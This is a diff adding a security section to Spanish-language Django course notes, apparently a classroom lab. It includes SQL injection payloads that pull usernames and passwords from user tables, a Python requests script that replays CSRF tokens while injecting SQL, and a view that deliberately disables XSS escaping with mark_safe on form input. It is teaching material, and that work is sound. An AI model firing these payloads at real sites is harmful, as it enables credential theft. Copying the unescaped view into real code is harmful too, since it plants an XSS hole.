@@ -1867,3 +1867,78 @@ El método de eliminación es delete(). Este método elimina inmediatamente el o
 
 
 # Seguridad
+
+Excelente curso gratuito: https://portswigger.net/web-security
+
+Mas informacion sobre Django y seguridad: https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/web_application_security
+
+Probemos estas estas cosas en este servidor:
+
+ec2-34-227-58-4.compute-1.amazonaws.com:8000/
+
+## SQL injection
+
+```
+3"  UNION SELECT username, password,NULL, NULL,NULL FROM auth_user --
+``` 
+
+
+##  CSRF
+
+```python
+import requests
+url='http://127.0.0.1:8000/about/'
+data = {
+'csrfmiddlewaretoken': 'ch0vTWQCrww59Qupz59SdM31u2dc0QopYDt36RhQmuNWgtFvnCGbxZb3OyMukBI7', 
+       'pr_id': '2'
+}
+
+cookies = {
+    'csrftoken': 'SMgTVpoWKT58wXuG6zwPp4gm5kj5vZ1hE8Jr8kPaFRmZDAFMU638JhoopQSnPKlZ',
+}
+response=requests.post(url, data=data , cookies=cookies)
+response.content
+```
+
+Ejecutemos el requests post inyectando SQL
+
+```python
+data2 = {
+'csrfmiddlewaretoken': 'ch0vTWQCrww59Qupz59SdM31u2dc0QopYDt36RhQmuNWgtFvnCGbxZb3OyMukBI7', 
+       'pr_id': '2"  UNION SELECT user, password,NULL FROM LOGINS --'
+}
+
+response=requests.post(url, data=data2, cookies=cookies)
+response.content
+```
+
+
+
+##  XSS Cross Site Scripting
+
+
+Django usa templates y proteje a nuestro sitio de la mayoria de los ataques XSS, podemos apagar esta proteccion para hacer algunas pruebas. Para esto vamos a marcar como seguro el campo nombre del formulario, esto provocara que django renderee cualquier cosa que sea enviada en el formulario.
+
+
+
+```python
+from django.utils.safestring import mark_safe
+def contact(request):
+    contact_form = ContactoForm
+    #validamos que ocurrio una peticion POST
+    if request.method == "POST":
+        #Traemos los datos enviados
+        contact_form = contact_form(data=request.POST)
+        #Chequeamos que los datos son validos, de ser asi, los asignamos a una variable
+        if contact_form.is_valid():
+            name = request.POST.get('name','')
+            email = request.POST.get('email','')
+            content = request.POST.get('content','')
+        #En lugar de renderizar el template de contacto hacemos un redireccionamiento enviando una variable OK
+            return render(request,'contact/contact.html',{'enviado': mark_safe(name)})
+    # si no entramos mediante un POST renderea normalmente.
+    return render(request,'contact/contact.html',{'form': contact_form})
+```
+
+https://tonybaloney.github.io/posts/xss-exploitation-in-django.html
+
